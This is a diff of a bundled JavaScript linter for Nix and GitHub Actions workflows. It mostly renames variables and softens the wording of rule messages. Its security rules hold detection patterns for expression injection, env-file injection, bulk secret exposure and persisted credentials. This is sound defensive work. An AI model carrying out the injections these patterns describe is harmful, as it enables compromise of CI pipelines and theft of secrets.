         if (ident.segments.at(-1) !== "buildRustPackage" || !isValueUse(file, ident)) continue;
         const arg = callArgument(file, ident);
-        const open3 = arg ? attrsetOf(file, arg) : void 0;
-        if (open3 === void 0) continue;
-        const source = localSource(file, open3);
+        const open4 = arg ? attrsetOf(file, arg) : void 0;
+        if (open4 === void 0) continue;
+        const source = localSource(file, open4);
         if (!source) continue;
-        const name = packageName2(file, open3);
+        const name = packageName2(file, open4);
         count += 1;
         report({
           path: file.path,
@@ -25896,22 +25896,22 @@ Preserve all build inputs, features, cross-compilation settings, patches and che
 // src/lint/rules/nix/sandbox-disabled.ts
 var SANDBOX_KEYS = /* @__PURE__ */ new Set(["sandbox", "build-use-sandbox", "build-use-chroot"]);
 function sandboxMode(value2) {
-  const text6 = value2.trim().replace(/;$/, "").trim().replace(/^(['"])(.*)\1$/, "$2").trim();
-  return text6 === "false" || text6 === "relaxed" ? text6 : void 0;
+  const text7 = value2.trim().replace(/;$/, "").trim().replace(/^(['"])(.*)\1$/, "$2").trim();
+  return text7 === "false" || text7 === "relaxed" ? text7 : void 0;
 }
 var NIX_CONFIG_KEY = /^(\s*)["']?NIX_CONFIG["']?\s*:/;
 function settingLine(project, setting, from) {
   const content2 = project.files.get(setting.path)?.content;
   if (content2 === void 0 || setting.source !== "env") return setting.line;
-  const lines = content2.split("\n").map((text6) => text6.replace(/\r$/, ""));
-  const start2 = lines.findIndex((text6, index) => index + 1 >= from && NIX_CONFIG_KEY.test(text6));
+  const lines = content2.split("\n").map((text7) => text7.replace(/\r$/, ""));
+  const start2 = lines.findIndex((text7, index) => index + 1 >= from && NIX_CONFIG_KEY.test(text7));
   if (start2 < 0) return setting.line;
   const indent = NIX_CONFIG_KEY.exec(lines[start2] ?? "")?.[1]?.length ?? 0;
   const key2 = new RegExp(`(?:^|[\\s"':|])${setting.key}\\s*=`);
   for (let index = start2; index < lines.length; index += 1) {
-    const text6 = lines[index] ?? "";
-    if (index > start2 && text6.trim() !== "" && text6.length - text6.trimStart().length <= indent) break;
-    if (key2.test(index === start2 ? text6.replace(NIX_CONFIG_KEY, " ") : text6)) return index + 1;
+    const text7 = lines[index] ?? "";
+    if (index > start2 && text7.trim() !== "" && text7.length - text7.trimStart().length <= indent) break;
+    if (key2.test(index === start2 ? text7.replace(NIX_CONFIG_KEY, " ") : text7)) return index + 1;
   }
   return setting.line;
 }
@@ -26043,8 +26043,8 @@ var NO_CHROOT = /(?<![\w'-])__noChroot\s*=\s*true\s*;/g;
 function noChrootReports(project) {
   return lintableNixFiles(project).flatMap((file) => {
     const derivations = new Set(file.idents.filter((ident) => /(?:^|\.)(?:mkDerivation|derivation)$/.test(ident.text)).flatMap((ident) => {
-      const open3 = calledAttrset(file, ident);
-      return open3 === void 0 ? [] : [open3];
+      const open4 = calledAttrset(file, ident);
+      return open4 === void 0 ? [] : [open4];
     }));
     return [...file.masked.matchAll(NO_CHROOT)].filter((match2) => derivations.has(enclosingOpen(file, match2.index))).map((match2) => ({
       path: file.path,
@@ -26155,11 +26155,11 @@ function hasPerStepPolicy(file, step) {
   if (policy2.test(first.slice(column2))) return true;
   const total = file.content.split("\n").length;
   for (let line = step.line + 1; line <= total; line += 1) {
-    const text6 = lineText(file.content, line);
-    if (text6.trim() === "" || text6.trim().startsWith("#")) continue;
-    const indent = /^\s*/.exec(text6)?.[0].length ?? 0;
+    const text7 = lineText(file.content, line);
+    if (text7.trim() === "" || text7.trim().startsWith("#")) continue;
+    const indent = /^\s*/.exec(text7)?.[0].length ?? 0;
     if (indent < column2) return false;
-    if (indent === column2 && policy2.test(text6.slice(column2))) return true;
+    if (indent === column2 && policy2.test(text7.slice(column2))) return true;
   }
   return false;
 }
@@ -26231,7 +26231,7 @@ var separate_nix_build_invocations_default = defineRule({
           }
         }
         flush2();
-        const resultUsed = others.some((text6) => RESULT_LINK.test(text6));
+        const resultUsed = others.some((text7) => RESULT_LINK.test(text7));
         for (const { builds: builds2 } of groups) {
           const first = builds2[0];
           if (!first || builds2.length < minBuilds) continue;
@@ -26322,8 +26322,8 @@ function builderCalls(file) {
   for (const ident of file.idents) {
     const last = ident.segments.at(-1) ?? "";
     if (!BUILDERS.has(last) && !(QUALIFIED_BUILDERS.has(last) && ident.segments.length >= 2)) continue;
-    const open3 = calledAttrset(file, ident);
-    if (open3 !== void 0) calls.push({ builder: last, open: open3 });
+    const open4 = calledAttrset(file, ident);
+    if (open4 !== void 0) calls.push({ builder: last, open: open4 });
   }
   return calls.sort((a, b) => a.open - b.open);
 }
@@ -26397,17 +26397,17 @@ function sourceLiterals(file) {
     const scope2 = scopeOf2(offset);
     if (!scope2) return;
     const start2 = skipSpace2(masked, skipSpace2(masked, end) + 1);
-    const text6 = masked.slice(start2, exprEnd(masked, start2)).trim();
-    found.push({ ...scope2, literal: DIR_LITERAL.test(text6) ? text6 : void 0 });
+    const text7 = masked.slice(start2, exprEnd(masked, start2)).trim();
+    found.push({ ...scope2, literal: DIR_LITERAL.test(text7) ? text7 : void 0 });
   };
   for (const ident of file.idents) {
     if (ident.text !== "src") continue;
     if (isBindingKey(masked, ident.offset, ident.end - ident.offset)) addBinding(ident.offset, ident.end);
     else if (!inInherit(masked, ident.offset) && !isValueUse(file, ident)) return [];
   }
-  for (const string3 of file.strings) {
-    if (string3.interpolated || string3.value !== "src" || masked[previousNonSpace(masked, string3.start)] === ".") continue;
-    if (isBindingKey(masked, string3.start, string3.end - string3.start)) addBinding(string3.start, string3.end);
+  for (const string4 of file.strings) {
+    if (string4.interpolated || string4.value !== "src" || masked[previousNonSpace(masked, string4.start)] === ".") continue;
+    if (isBindingKey(masked, string4.start, string4.end - string4.start)) addBinding(string4.start, string4.end);
   }
   for (const statement2 of inheritStatements(file)) {
     if (!statement2.names.some(({ name }) => name === "src")) continue;
@@ -26423,8 +26423,8 @@ function inheritedLiteralLookup(file) {
   ]).sort((a, b) => a.offset - b.offset);
   const active2 = /* @__PURE__ */ new Map();
   let next = 0;
-  return (open3) => {
-    while (next < events.length && events[next].offset <= open3) {
+  return (open4) => {
+    while (next < events.length && events[next].offset <= open4) {
       const event = events[next++];
       const count = (active2.get(event.literal) ?? 0) + event.delta;
       if (count === 0) active2.delete(event.literal);
@@ -26438,8 +26438,8 @@ function findings3(project, file) {
   const calls = builderCalls(file);
   const isFlake = file.path === "flake.nix" || file.path.endsWith("/flake.nix");
   let inheritedLiteral;
-  for (const { builder, open: open3 } of calls) {
-    const binding2 = bindingNamed(file, open3, "src");
+  for (const { builder, open: open4 } of calls) {
+    const binding2 = bindingNamed(file, open4, "src");
     if (binding2) {
       const value2 = file.masked.slice(binding2.valueStart, binding2.valueEnd).trim();
       if (DIR_LITERAL.test(value2)) {
@@ -26456,12 +26456,12 @@ function findings3(project, file) {
       }
       continue;
     }
-    const inherited = inheritStatementsAt(file, open3).find(
+    const inherited = inheritStatementsAt(file, open4).find(
       (statement2) => statement2.source === void 0 && statement2.names.some((entry3) => entry3.name === "src")
     );
     if (!inherited) continue;
     inheritedLiteral ??= inheritedLiteralLookup(file);
-    const literal4 = inheritedLiteral(open3);
+    const literal4 = inheritedLiteral(open4);
     if (literal4 === void 0) continue;
     const dir = resolveDir(file, literal4);
     const where = dir === void 0 ? void 0 : describeDir(project, dir);
@@ -26597,14 +26597,14 @@ function publishedEntries(project, manifest) {
   const bin = manifest.json.bin;
   if (typeof bin === "string") paths.push(bin);
   else if (bin && typeof bin === "object") paths.push(...Object.values(bin).filter((value2) => typeof value2 === "string"));
-  const entries2 = /* @__PURE__ */ new Set();
+  const entries3 = /* @__PURE__ */ new Set();
   for (const path of paths) {
     const clean2 = path.replace(/^\.?\/+/, "");
     if (!clean2 || clean2.startsWith("..")) continue;
     const [first, ...rest] = clean2.split("/");
-    if (first) entries2.add(rest.length > 0 ? first : clean2);
+    if (first) entries3.add(rest.length > 0 ? first : clean2);
   }
-  if (entries2.size > 0) return [...entries2];
+  if (entries3.size > 0) return [...entries3];
   const tsconfig = looseJson(project.files.get(joinPath4(manifest.dir, "tsconfig.json"))?.content ?? "");
   const outDir = tsconfig?.compilerOptions?.outDir;
   if (typeof outDir === "string") {
@@ -26721,14 +26721,14 @@ var files_allowlist_default = defineRule({
       if (typeof manifest.json.version !== "string") continue;
       if (manifest.json.files !== void 0) continue;
       if (project.files.has(joinPath4(manifest.dir, ".npmignore"))) continue;
-      const entries2 = publishedEntries(project, manifest);
-      const location2 = manifest.dir || "the repository root";
+      const entries3 = publishedEntries(project, manifest);
+      const location3 = manifest.dir || "the repository root";
       report({
         path: manifest.path,
         line: manifest.lineOf("name"),
         key: "files-missing",
-        message: `\`${manifest.name}\` is publishable but has no \`files\` allowlist or \`.npmignore\`, so \`npm publish\` packs everything in ${location2} (sources, tests, fixtures, configs) into the tarball.`,
-        suggestion: `Add \`"files": ${JSON.stringify(entries2)}\` to ${manifest.path} so the tarball only contains build output (package.json, README, and LICENSE are always included), then check the contents with \`npm pack --dry-run\`.`
+        message: `\`${manifest.name}\` is publishable but has no \`files\` allowlist or \`.npmignore\`, so \`npm publish\` packs everything in ${location3} (sources, tests, fixtures, configs) into the tarball.`,
+        suggestion: `Add \`"files": ${JSON.stringify(entries3)}\` to ${manifest.path} so the tarball only contains build output (package.json, README, and LICENSE are always included), then check the contents with \`npm pack --dry-run\`.`
       });
     }
   }
@@ -26871,7 +26871,7 @@ var version_drift_default = defineRule({
       if (!first) continue;
       const related2 = [];
       for (const entry2 of rest) {
-        if (entry2.manifest === first.manifest || related2.some((location2) => location2.path === entry2.manifest.path)) continue;
+        if (entry2.manifest === first.manifest || related2.some((location3) => location3.path === entry2.manifest.path)) continue;
         related2.push({ path: entry2.manifest.path, line: entry2.manifest.lineOf(dependency) });
       }
       const summary3 = [...specs].slice(0, 4).map(([spec2, paths]) => `\`${spec2}\` (${paths.slice(0, 3).join(", ")}${paths.length > 3 ? `, +${paths.length - 3}` : ""})`).join(", ");
@@ -26917,9 +26917,9 @@ function setupActionOf(step) {
   if (action?.kind !== "remote" || action.name === void 0) return void 0;
   return Object.hasOwn(SETUP_ACTIONS, action.name) ? action.name : void 0;
 }
-function hash2(text6) {
+function hash2(text7) {
   let value2 = 5381;
-  for (let index = 0; index < text6.length; index += 1) value2 = (value2 * 33 ^ text6.charCodeAt(index)) >>> 0;
+  for (let index = 0; index < text7.length; index += 1) value2 = (value2 * 33 ^ text7.charCodeAt(index)) >>> 0;
   return value2.toString(16).padStart(8, "0");
 }
 function stable(value2) {
@@ -26973,15 +26973,15 @@ function nestedPair(parent, mapKey, key2) {
 }
 function rawScalar(content2, node) {
   if (!(0, import_yaml15.isScalar)(node) || !node.range) return void 0;
-  const text6 = content2.slice(node.range[0], node.range[1]).trim();
-  const quoted = /^(["'])([\s\S]*)\1$/.exec(text6);
-  return quoted ? quoted[2] : text6;
+  const text7 = content2.slice(node.range[0], node.range[1]).trim();
+  const quoted = /^(["'])([\s\S]*)\1$/.exec(text7);
+  return quoted ? quoted[2] : text7;
 }
 var VARYING_CONTEXTS = /\b(?:env|steps|job|jobs|matrix|strategy|runner|needs)\s*(?:\.|\[)/;
 function isPositionIndependent(value2) {
   if (typeof value2 !== "string") return value2 === null || typeof value2 === "number" || typeof value2 === "boolean";
   const expressions = value2.match(/\$\{\{[\s\S]*?\}\}/g) ?? [];
-  return expressions.every((expression) => !VARYING_CONTEXTS.test(expression));
+  return expressions.every((expression2) => !VARYING_CONTEXTS.test(expression2));
 }
 
 // src/lint/rules/redundancy/duplicate-command.ts
@@ -27037,8 +27037,8 @@ var duplicate_command_default = defineRule({
   meta: {
     id: "redundancy/duplicate-command",
     ruleset: "redundancy",
-    description: "A job should not run the same non-trivial shell command more than once.",
-    rationale: "Repeating an install, build, or test command in one job repeats its cost on every run. It is usually left over from merging two step lists and makes it unclear which invocation the job actually depends on.",
+    description: "Review repeated non-trivial shell commands for potentially redundant work.",
+    rationale: "Repeated command text can indicate avoidable work, but identical text does not establish identical effects or cost: files, environment, tool caches and external state may have changed. Check conditions and intervening effects before removing an invocation, then measure any savings.",
     kind: "practice",
     defaultSeverity: "info",
     presets: ["strict"],
@@ -27064,12 +27064,12 @@ var duplicate_command_default = defineRule({
           if (!step.run || STATEFUL.test(step.run.value)) continue;
           const context4 = `${workingDirectory(workflow, job, step) ?? ""}\0${step.if ?? ""}\0${stable(step.env)}`;
           for (const { command, line } of commandsOf(step)) {
-            const text6 = command.trim().replace(/\s+/g, " ");
-            const words6 = commandWords(text6);
+            const text7 = command.trim().replace(/\s+/g, " ");
+            const words6 = commandWords(text7);
             const program = words6[0];
             if (program === void 0 || TRIVIAL2.has(program) || words6.length < MIN_WORDS) continue;
-            if (/[<>]/.test(text6) || text6.includes("$(") || text6.includes("`")) continue;
-            const key2 = `${text6}\0${context4}`;
+            if (/[<>]/.test(text7) || text7.includes("$(") || text7.includes("`")) continue;
+            const key2 = `${text7}\0${context4}`;
             const first = seen.get(key2);
             if (!first) {
               seen.set(key2, { line, count: 1 });
@@ -27080,8 +27080,8 @@ var duplicate_command_default = defineRule({
               path: workflow.path,
               line,
               key: `${job.key}.duplicate-command.${hash2(key2)}.${first.count}`,
-              message: `\`${text6}\` already ran earlier in job "${job.id}" (line ${first.line}).`,
-              suggestion: "Remove the repeated command, or explain with a comment why the second run is required.",
+              message: `\`${text7}\` also appears earlier in job "${job.id}" (line ${first.line}).`,
+              suggestion: "Verify conditions and intervening effects before removing the repeated command, or document why both invocations are required.",
               related: [{ path: workflow.path, line: first.line }]
             });
           }
@@ -27096,8 +27096,8 @@ var duplicate_setup_step_default = defineRule({
   meta: {
     id: "redundancy/duplicate-setup-step",
     ruleset: "redundancy",
-    description: "A job should not run the same toolchain setup action twice with the same inputs.",
-    rationale: "Running a setup action a second time with identical inputs reinstalls the same toolchain, adds download and cache-restore time to every run, and usually signals a copy-paste mistake that hides which configuration is authoritative.",
+    description: "Review repeated toolchain setup declarations with matching visible inputs.",
+    rationale: "Repeated setup declarations may add avoidable work, but tool caches can avoid downloads and intervening steps can change the environment or toolchain. Matching visible inputs alone does not establish that the second setup is redundant. Verify conditions, outputs and environment requirements before removing it.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -27129,8 +27129,8 @@ var duplicate_setup_step_default = defineRule({
             path: workflow.path,
             line: step.line,
             key: `${step.key}.duplicate-setup`,
-            message: `Job "${job.id}" runs ${action} again with the same inputs as the step on line ${first.line}.`,
-            suggestion: "Remove the repeated setup step; the toolchain from the first step is still on PATH.",
+            message: `Job "${job.id}" declares ${action} again with matching visible inputs to the step on line ${first.line}.`,
+            suggestion: "Before removing the repeated setup, verify conditions, referenced outputs and any toolchain or environment changes between the steps.",
             related: [{ path: workflow.path, line: first.line }]
           });
         }
@@ -27161,7 +27161,7 @@ var rebuild_per_job_default = defineRule({
     id: "redundancy/rebuild-per-job",
     ruleset: "redundancy",
     description: "Several jobs in a workflow should not each rebuild the same project from scratch.",
-    rationale: "When multiple jobs run the same build command on the same runner type, the workflow pays for the build several times and the jobs may test or ship slightly different outputs. Building once and passing the result through an artifact cuts runner minutes and guarantees every downstream job uses the same bits.",
+    rationale: "Repeated build commands may duplicate work, but matching visible commands and runner labels do not establish equivalent inputs or outputs. Where consumers can safely share a verified immutable artifact, building once may reduce repeated work and align their inputs. Artifact transfer, serialization and changed critical paths can offset the saving; validate semantics and measure the result.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["agentic", "strict"],
@@ -27450,7 +27450,7 @@ var toolchain_version_drift_default = defineRule({
     }
     for (const [key2, files] of byInput) {
       const [action = "", input2 = ""] = key2.split("\0");
-      const uses = [...files.values()].filter((entries2) => !conflicting(entries2.map((use) => use.version))).flat();
+      const uses = [...files.values()].filter((entries3) => !conflicting(entries3.map((use) => use.version))).flat();
       const versions = [...new Set(uses.map((use) => use.version))];
       if (new Set(uses.map((use) => use.path)).size < 2 || !conflicting(versions)) continue;
       const [first, ...others] = uses;
@@ -27502,11 +27502,11 @@ function imageName3(ref) {
   const name = last.split(":")[0] ?? last;
   return /^[a-z0-9][a-z0-9._-]*$/i.test(name) ? name.toLowerCase() : "<image>";
 }
-function lineOfText(file, fromLine, text6) {
+function lineOfText(file, fromLine, text7) {
   if (!file) return fromLine;
   const lines = file.content.split(/\r?\n/);
   for (let index = Math.max(0, fromLine - 1); index < lines.length; index += 1) {
-    if (lines[index]?.includes(text6)) return index + 1;
+    if (lines[index]?.includes(text7)) return index + 1;
   }
   return fromLine;
 }
@@ -27608,11 +27608,11 @@ var ghcr_default = defineRule({
     let pushesToGhcr = false;
     for (const model of [...project.workflows, ...project.actions]) {
       for (const job of model.jobs) {
-        const entries2 = expandedJobSteps(project, model, job);
+        const entries3 = expandedJobSteps(project, model, job);
         const destinations = [];
         const logins = [];
         let unknownPushes = 0;
-        for (const entry2 of entries2) {
+        for (const entry2 of entries3) {
           const { step, path } = entry2;
           const file = project.files.get(path);
           if (usesAction2(step, "docker/build-push-action")) {
@@ -27622,7 +27622,7 @@ var ghcr_default = defineRule({
             const raw = withString(step, "tags")?.trim();
             const output2 = /^\$\{\{\s*steps\.([\w-]+)\.outputs\.tags\s*\}\}$/.exec(raw ?? "");
             if (output2) {
-              const meta = entries2.find((candidate) => candidate.step.id === output2[1] && usesAction2(candidate.step, "docker/metadata-action"));
+              const meta = entries3.find((candidate) => candidate.step.id === output2[1] && usesAction2(candidate.step, "docker/metadata-action"));
               const images = meta ? metadataImages(meta.step) : [];
               const metaFile = meta ? project.files.get(meta.path) : void 0;
               for (const image of images) {
@@ -27804,8 +27804,8 @@ var github_npm_default = defineRule({
     const githubScopes = /* @__PURE__ */ new Set();
     for (const [path, file] of project.files) {
       if (!/(^|\/)\.npmrc$/.test(path)) continue;
-      file.content.split(/\r?\n/).forEach((text6, index) => {
-        const match2 = /^\s*(@[^:\s]+):registry\s*=\s*(\S+)/.exec(text6);
+      file.content.split(/\r?\n/).forEach((text7, index) => {
+        const match2 = /^\s*(@[^:\s]+):registry\s*=\s*(\S+)/.exec(text7);
         if (!match2) return;
         const scope2 = (match2[1] ?? "").toLowerCase();
         const url = match2[2] ?? "";
@@ -27837,8 +27837,8 @@ var github_npm_default = defineRule({
     if (internalPackages.length > 0) {
       for (const model of [...project.workflows, ...project.actions]) {
         for (const job of model.jobs) {
-          const entries2 = expandedJobSteps(project, model, job);
-          entries2.forEach((entry2, position) => {
+          const entries3 = expandedJobSteps(project, model, job);
+          entries3.forEach((entry2, position) => {
             for (const { command, line } of commandsOf(entry2.step)) {
               const registry = publishRegistry(command);
               if (registry === void 0) continue;
@@ -27854,7 +27854,7 @@ var github_npm_default = defineRule({
                 continue;
               }
               if (allPinnedToGithub) continue;
-              const setup = entries2.slice(0, position).reverse().find((candidate) => setupNode(candidate.step) && candidate.step.with.has("registry-url"));
+              const setup = entries3.slice(0, position).reverse().find((candidate) => setupNode(candidate.step) && candidate.step.with.has("registry-url"));
               const url = setup?.step.with.get("registry-url");
               if (!setup || !url || url.kind !== "literal" || isGithubRegistry(String(url.value))) continue;
               const related2 = [{ path: entry2.path, line }];
@@ -27927,12 +27927,12 @@ var UNTRUSTED_CONTEXT = new RegExp(
   ].join("|"),
   "i"
 );
-function normalizeAccess(text6) {
-  return text6.replace(/\s*\[\s*(['"])([A-Za-z_][A-Za-z0-9_-]*)\1\s*\]/g, ".$2");
+function normalizeAccess(text7) {
+  return text7.replace(/\s*\[\s*(['"])([A-Za-z_][A-Za-z0-9_-]*)\1\s*\]/g, ".$2");
 }
-function untrustedExpressions(text6) {
+function untrustedExpressions(text7) {
   const result = [];
-  for (const match2 of text6.matchAll(/\$\{\{([\s\S]*?)\}\}/g)) {
+  for (const match2 of text7.matchAll(/\$\{\{([\s\S]*?)\}\}/g)) {
     const context4 = UNTRUSTED_CONTEXT.exec(normalizeAccess(match2[1] ?? ""))?.[0];
     if (context4 !== void 0) result.push({ text: match2[0], context: context4, offset: match2.index });
   }
@@ -27992,8 +27992,8 @@ function untrustedEnvNames(workflow, job, step, include = () => true) {
   }
   return [...names];
 }
-function isRefName(expression) {
-  return /head_ref|head\.ref|head_branch|head\.label/i.test(expression.context);
+function isRefName(expression2) {
+  return /head_ref|head\.ref|head_branch|head\.label/i.test(expression2.context);
 }
 var UNTRUSTED_REF = /\$\{\{[^}]*(?:github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref|github\.event\.workflow_run\.(?:head_sha|head_branch)|github\.event\.workflow_run\.pull_requests[^}]*\.head\.(?:sha|ref))[^}]*\}\}|refs\/pull\//i;
 var UNTRUSTED_REPOSITORY = /\$\{\{[^}]*(?:github\.event\.pull_request\.head\.repo\.full_name|github\.event\.workflow_run\.head_repository\.full_name)[^}]*\}\}/i;
@@ -28084,17 +28084,17 @@ var env_file_injection_default = defineRule({
   check({ project, report }) {
     for (const { workflow, job, step } of steps([...project.workflows, ...project.actions])) {
       if (!step.run) continue;
-      const tainted = untrustedEnvNames(workflow, job, step, (expression) => !isRefName(expression));
+      const tainted = untrustedEnvNames(workflow, job, step, (expression2) => !isRefName(expression2));
       for (const line of scriptLines(step)) {
         const target = ENV_FILE_WRITE.exec(line.text)?.[1];
         if (target === void 0) continue;
-        const expression = untrustedExpressions(line.text)[0];
-        if (expression) {
+        const expression2 = untrustedExpressions(line.text)[0];
+        if (expression2) {
           report({
             path: workflow.path,
             line: line.line,
             key: `${step.key}.run`,
-            message: `\`${expression.context}\` is interpolated into a write to $${target}; a crafted value can inject extra variables, paths, or outputs.`,
+            message: `\`${expression2.context}\` is interpolated into a write to $${target}; a crafted value can inject extra variables, paths, or outputs.`,
             suggestion: "Pass the value through `env:`, validate it against a strict pattern, and use a heredoc delimiter for multi-line values before writing it."
           });
           continue;
@@ -28218,13 +28218,13 @@ var expression_injection_default = defineRule({
       if (step.run) {
         for (const line of scriptLines(step)) {
           if (ENV_FILE_WRITE.test(line.text)) continue;
-          for (const expression of untrustedExpressions(line.text)) {
+          for (const expression2 of untrustedExpressions(line.text)) {
             report({
               path: workflow.path,
               line: line.line,
               key: `${step.key}.run`,
-              message: `\`${expression.context}\` is interpolated into a shell script, where a crafted value becomes code.`,
-              suggestion: `Map it to an environment variable on the step (e.g. \`env: { VALUE: ${expression.text} }\`) and reference \`"$VALUE"\` in the script.`
+              message: `\`${expression2.context}\` is interpolated into a shell script, where a crafted value becomes code.`,
+              suggestion: `Map it to an environment variable on the step (e.g. \`env: { VALUE: ${expression2.text} }\`) and reference \`"$VALUE"\` in the script.`
             });
           }
         }
@@ -28233,14 +28233,14 @@ var expression_injection_default = defineRule({
         const script = step.with.get("script");
         if (typeof script?.value !== "string") continue;
         const seen = /* @__PURE__ */ new Set();
-        for (const expression of untrustedExpressions(script.value)) {
-          if (seen.has(expression.context)) continue;
-          seen.add(expression.context);
+        for (const expression2 of untrustedExpressions(script.value)) {
+          if (seen.has(expression2.context)) continue;
+          seen.add(expression2.context);
           report({
             path: workflow.path,
             line: script.line,
             key: `${step.key}.with.script`,
-            message: `\`${expression.context}\` is interpolated into github-script code, where a crafted value becomes JavaScript.`,
+            message: `\`${expression2.context}\` is interpolated into github-script code, where a crafted value becomes JavaScript.`,
             suggestion: "Read the value from the `context` object (e.g. `context.payload.pull_request.title`) or pass it through `env:` and `process.env`."
           });
         }
@@ -28464,8 +28464,8 @@ function addPersistCredentials(file, workflow, step) {
   const usesPair = node.items.find((pair) => (0, import_yaml20.isScalar)(pair.key) && pair.key.value === "uses");
   if (!usesPair || !(0, import_yaml20.isScalar)(usesPair.value) || !SINGLE_LINE.has(usesPair.value.type)) return void 0;
   const usesLine = lineOfNode(workflow.source, usesPair.key);
-  const text6 = lineText(file.content, usesLine);
-  const match2 = /^(\s*)(-\s+)?uses\s*:/.exec(text6);
+  const text7 = lineText(file.content, usesLine);
+  const match2 = /^(\s*)(-\s+)?uses\s*:/.exec(text7);
   if (!match2) return void 0;
   const indent = (match2[1] ?? "") + " ".repeat(match2[2]?.length ?? 0);
   return fix(description, insertLinesAfter(file, usesLine, [`${indent}with:`, `${indent}  persist-credentials: false`]));
@@ -28640,8 +28640,8 @@ var secrets_bulk_expose_default = defineRule({
       if (!file) continue;
       const lineCount = file.content.split("\n").length;
       for (let line = 1; line <= lineCount; line++) {
-        const text6 = lineText(file.content, line);
-        if (/^\s*#/.test(text6) || !TO_JSON_SECRETS.test(text6)) continue;
+        const text7 = lineText(file.content, line);
+        if (/^\s*#/.test(text7) || !TO_JSON_SECRETS.test(text7)) continue;
         report({
           path: workflow.path,
           line,
@@ -28818,7 +28818,7 @@ function outcomeInspected(steps2, step) {
   return steps2.some((other) => {
     if (other === step) return false;
     const texts = [other.if, other.run?.value, JSON.stringify(other.env), JSON.stringify([...other.with.values()].map((entry2) => entry2.value))];
-    return texts.some((text6) => text6 !== void 0 && pattern.test(text6));
+    return texts.some((text7) => text7 !== void 0 && pattern.test(text7));
   });
 }
 function stepNode2(source, step) {
@@ -28858,13 +28858,13 @@ function scriptLines2(script) {
   for (const raw of script.split("\n")) {
     const lineOffset = offset;
     offset += raw.length + 1;
-    const text6 = raw.replace(/\r$/, "");
+    const text7 = raw.replace(/\r$/, "");
     if (buffer === "") start2 = lineOffset;
-    if (/\\\s*$/.test(text6)) {
-      buffer += text6.replace(/\\\s*$/, " ");
+    if (/\\\s*$/.test(text7)) {
+      buffer += text7.replace(/\\\s*$/, " ");
       continue;
     }
-    buffer += text6;
+    buffer += text7;
     const trimmed = buffer.trim();
     if (trimmed !== "" && !trimmed.startsWith("#")) result.push({ text: buffer, offset: start2 });
     buffer = "";
@@ -28912,8 +28912,8 @@ var cache_disabled_install_default = defineRule({
   meta: {
     id: "testing/cache-disabled-install",
     ruleset: "testing",
-    description: "Jobs that restore a package-manager cache should not clear or bypass that cache in their run steps.",
-    rationale: "Restoring a dependency cache costs a download and a save on every run; clearing it, pointing installs at an empty temporary cache or passing `--no-cache-dir` throws that work away and makes every install download from the registry again.",
+    description: "Review installs that appear to clear or bypass a configured package-manager cache.",
+    rationale: "Clearing or bypassing compatible restored package-manager entries can cause avoidable work. Restore/save operations are conditional, and clearing a cache does not necessarily require a registry download. Verify actual cache paths, command ordering, install behavior and any correctness or isolation requirement before changing the workflow.",
     kind: "practice",
     defaultSeverity: "info",
     presets: ["agentic", "strict"],
@@ -28943,8 +28943,8 @@ var cache_disabled_install_default = defineRule({
             path: workflow.path,
             line: entry2.direct ? entry2.line : stepLine(entry2.owner),
             key: `${entry2.step.key}:${defeat.ecosystem}:${entry2.command}`,
-            message: `${defeat.what} the ${defeat.ecosystem} cache that job \`${job.id}\` restores, so the restore is wasted and dependencies download again.`,
-            suggestion: "Drop the cache-clearing command or flag and let the install use the restored cache."
+            message: `${defeat.what} the ${defeat.ecosystem} cache in job \`${job.id}\`, which also configures caching; this may prevent reuse of restored entries.`,
+            suggestion: "If clearing or bypassing the cache is not needed for correctness or isolation, verify the paths and ordering, allow compatible cache reuse, and measure the result."
           });
         }
       }
@@ -28992,7 +28992,7 @@ var fixed_sleep_default = defineRule({
     id: "testing/fixed-sleep",
     ruleset: "testing",
     description: "Run steps should wait for services to become ready instead of sleeping for a fixed time.",
-    rationale: "A fixed `sleep` before tests is a guess: on a fast runner it wastes the whole interval on every run, and on a slow or busy runner it is too short and the tests fail intermittently. Polling for readiness returns as soon as the service is up and fails clearly when it never comes up.",
+    rationale: "A fixed delay can outlast service startup or finish before the service is ready. A bounded readiness check can reduce unnecessary waiting and report timeout failures, but its health predicate, polling interval and timeout must match the workload. Preserve deliberate rate-limiting or propagation delays rather than assuming every sleep is redundant.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -29030,8 +29030,8 @@ var fixed_sleep_default = defineRule({
             path: workflow.path,
             line: entry2.direct ? entry2.line : stepLine(entry2.owner),
             key: `${entry2.step.key}:${entry2.command}`,
-            message: `\`${wait.text}\` waits a fixed ${wait.seconds} seconds instead of checking that what it waits for is ready.`,
-            suggestion: "Poll for readiness instead: `docker compose up --wait`, service-container health checks (`--health-cmd`), `npx wait-on <url>`, or a bounded `until curl -fsS <url>; do sleep 1; done` loop."
+            message: `\`${wait.text}\` specifies a fixed ${wait.seconds} seconds of waiting; no readiness condition is visible in this command.`,
+            suggestion: "Consider an appropriate health predicate using `docker compose up --wait`, service-container health checks, or `wait-on`, with an explicit overall timeout. Verify that the delay is not needed for another purpose."
           });
         }
       }
@@ -29101,8 +29101,8 @@ var masked_failures_default = defineRule({
               suggestion: "Remove `continue-on-error`. To collect results before failing, give the step an `id` and fail a later step on `steps.<id>.outcome == 'failure'`."
             });
           }
-          for (const { text: text6, offset } of scriptLines2(step.run?.value ?? "")) {
-            const swallowed = swallowedTest(text6);
+          for (const { text: text7, offset } of scriptLines2(step.run?.value ?? "")) {
+            const swallowed = swallowedTest(text7);
             if (!swallowed) continue;
             report({
               path: workflow.path,
@@ -29125,8 +29125,8 @@ var playwright_browser_cache_default = defineRule({
   meta: {
     id: "testing/playwright-browser-cache",
     ruleset: "testing",
-    description: "Jobs that download Playwright browsers should cache them or run in the Playwright container image.",
-    rationale: "`playwright install` downloads several hundred megabytes of browser builds on every run. Restoring ~/.cache/ms-playwright keyed on the Playwright version (or using the image that ships the browsers) turns that download into a cache hit.",
+    description: "Evaluate browser reuse when Playwright downloads are a measured bottleneck.",
+    rationale: "`playwright install` may download missing browser builds; runner images or existing caches may already supply them. Restoring an archive can cost as much as downloading the browsers, and Linux OS dependencies still need installation. Inspect actual install/restore timings and version/platform compatibility before choosing a browser cache or matching Playwright image.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -29162,8 +29162,8 @@ var playwright_browser_cache_default = defineRule({
           path: workflow.path,
